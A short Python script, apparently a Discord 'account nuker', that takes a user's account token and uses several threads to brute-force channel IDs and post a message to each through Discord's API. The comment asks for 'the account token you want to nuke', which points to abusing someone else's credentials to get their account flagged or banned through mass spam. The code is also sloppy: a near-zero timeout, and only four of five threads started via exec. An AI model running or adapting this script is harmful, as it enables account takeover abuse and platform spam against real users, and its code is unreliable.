#! Removing this *might* crash your computer
import psutil
import os
p = psutil.Process(os.getpid())
p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)

import requests
import threading

token = "" # Insert the account token you want to nuke here

message = "Hello world!"

def sendmessage(token, message, start=100000000000000000):
    for i in range(start,99999999999999999999):
        channel_id = i
        url = f"https://discord.com/api/channels/{channel_id}/messages"

        headers = {"Authorization": token}
        payload = {"content": message}

        try:
            requests.post(url, headers=headers, json=payload, timeout=0.0000000000000000000000000000001)
        except requests.Timeout:
            pass
        except Exception as e:
            print(e)


# Threading the shit out of it
threadamount = 5

thread1 = threading.Thread(target=sendmessage, args=(token, message, 100000000000000000))
thread2 = threading.Thread(target=sendmessage, args=(token, message, 300000000000000000))
thread3 = threading.Thread(target=sendmessage, args=(token, message, 500000000000000000))
thread4 = threading.Thread(target=sendmessage, args=(token, message, 700000000000000000))
thread5 = threading.Thread(target=sendmessage, args=(token, message, 900000000000000000))

for i in range(1,threadamount):
    exec(f"thread{i}.start()")
